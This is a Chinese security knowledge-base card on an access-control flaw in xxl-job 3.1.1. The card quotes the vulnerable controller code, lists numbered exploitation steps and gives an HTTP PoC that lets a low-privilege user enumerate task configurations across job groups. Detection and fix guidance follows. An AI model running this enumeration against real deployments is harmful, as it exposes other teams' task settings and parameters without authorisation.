---
id: web-generic-auth-xxl-job-getjobsbygroup-jobgroup-idor
title: xxl-job 3.1.1 /joblog/getJobsByGroup 普通用户越权枚举任意分组任务
type: scenario
domain: web
path: web/generic/auth
technique: xxl-job-jobgroup-idor-enumeration
tags:
- web
- idor
- horizontal-privilege-escalation
- access-control
- xxl-job
- java
- spring
cve: []
severity: medium
confidence: high
status: verified
affected_versions: 3.1.1（原文标注版本；未给出修复版本）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V17
  verified_at: '2026-11-05T01:54:37+08:00'
  notes: 已对照原文与5张图核对：PermissionInterceptor 默认 needLogin=true/needAdminuser=false，/joblog/getJobsByGroup 无 @PermissionLimit 且未调用 validJobGroupPermission，普通用户(role=0,permission空)可读取 jobGroup=2 的任务列表(图02)，与卡片一致；3.1.1 为原文测试/受影响版本，未给修复版本。未在本机复现；frontmatter 无 sources/source_url。
url: /docs/web/generic/auth/web-generic-auth-xxl-job-getjobsbygroup-jobgroup-idor/
draft: false
kb_aliases:
- xxl-job getJobsByGroup 越权
- xxl-job 任务枚举 IDOR
- xxl-job 水平越权
- jobGroup 权限校验缺失
- xxl-job 普通用户枚举任务
---

## 一句话结论

xxl-job 3.1.1 的 `/xxl-job-admin/joblog/getJobsByGroup` 只要求登录，未做 `jobGroup` 级权限校验；任意低权限普通用户（`role=0`、`permission` 为空）只要传入任意 `jobGroup`，就能读取该执行器分组下的任务列表与任务配置，实现跨分组枚举。

## 原理

- 全局鉴权由 `PermissionInterceptor.preHandle` 完成，默认值为 `needLogin=true`、`needAdminuser=false`：
  ```java
  boolean needLogin = true;
  boolean needAdminuser = false;
  PermissionLimit permission = method.getMethodAnnotation(PermissionLimit.class);
  if (permission != null) {
      needLogin = permission.limit();
      needAdminuser = permission.adminuser();
  }
  ```
  也就是说，未标注 `@PermissionLimit` 的路由默认只校验“是否登录”，不校验管理员角色，更不校验具体执行器分组。
- 项目对分组权限的细化依赖方法内部显式调用 `PermissionInterceptor.validJobGroupPermission(request, jobLog.getJobGroup())`（例如 `/logDetailPage`），再由 `XxlJobUser.validPermission(jobGroup)` 判断用户 `permission` 字段中是否包含该分组 ID。
- `/joblog/getJobsByGroup` 既没有 `@PermissionLimit`，方法体内也没有调用 `validJobGroupPermission`，直接把客户端传入的 `jobGroup` 交给 DAO：
  ```java
  @RequestMapping("/getJobsByGroup")
  @ResponseBody
  public ReturnT<List<XxlJobInfo>> getJobsByGroup(@RequestParam("jobGroup") int jobGroup) {
      List<XxlJobInfo> list = xxlJobInfoDao.getJobsByGroup(jobGroup);
      return new ReturnT<List<XxlJobInfo>>(list);
  }
  ```
- 因此权限边界只剩“已登录”。攻击者用普通账号登录后遍历 `jobGroup` 整数值，即可读取所有执行器分组的任务；返回的 `XxlJobInfo` 含任务描述、CRON、路由策略、`executorHandler`、`executorParam` 等配置，可用于进一步定位高价值任务或构造后续攻击。

## 触发条件

- 目标为 xxl-job 3.1.1（原文版本）或存在相同缺失校验的版本；
- 攻击者持有任意可登录的普通账号（非管理员、无分组权限），或通过其他漏洞获得低权限会话；
- `/xxl-job-admin/joblog/getJobsByGroup` 可从外部访问；
- `jobGroup` 为连续或可猜测的整数，便于遍历。

## 利用步骤

1. 用普通账号登录 `/xxl-job-admin`，取得会话 Cookie（如 `XXL_JOB_LOGIN_IDENTITY`）。
2. 直接请求 `/xxl-job-admin/joblog/getJobsByGroup`，`jobGroup` 从 1 开始递增遍历。
3. 从 JSON 响应的 `content` 数组读取各分组的任务 ID、描述、调度配置、执行器 Handler 与参数。
4. 记录可访问的分组与任务，作为后续越权操作或社工/攻击的目标。

## PoC

```http
POST /xxl-job-admin/joblog/getJobsByGroup HTTP/1.1
Host: target:8080
Cookie: XXL_JOB_LOGIN_IDENTITY=<普通用户会话>
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest

jobGroup=2
```

```json
{
  "code": 200,
  "msg": null,
  "content": [
    {
      "id": 2,
      "jobGroup": 2,
      "jobDesc": "示例任务",
      "scheduleType": "NONE",
      "executorHandler": "demoJobHandler",
      "executorParam": "...",
      "executorRouteStrategy": "FIRST"
    }
  ]
}
```

## 变体与关联

- 同类问题可出现在任何“只标注登录、未标注 `@PermissionLimit`、方法内又漏掉 `validJobGroupPermission`”的 Controller 上，可按同一模式审计其它 `jobGroup`/`id` 参数接口。
- 关联：[[web-generic-auth-xxl-job-jobinfo-remove-idor]]（同一权限模型下的越权删除接口）。
- 与未授权访问的区别：本场景要求已登录，属于水平越权/权限校验缺失，而非完全未授权。

## 检测与防御

- 检测：普通用户请求中出现对不存在于其 `permission` 列表中的 `jobGroup` 的访问；短时间内 `jobGroup` 递增遍历；`getJobsByGroup` 返回跨分组数据。
- 修复：在所有按 `jobGroup` 取数的接口内调用 `PermissionInterceptor.validJobGroupPermission`，或加 `@PermissionLimit(adminuser=true)`；对返回结果按当前用户权限过滤（`filterJobGroupByRole`）。
- 加固：统一在拦截器层做资源级授权，避免依赖每个方法手工调用；对任务配置中的 `executorParam` 等敏感字段做脱敏；记录并告警跨分组访问。
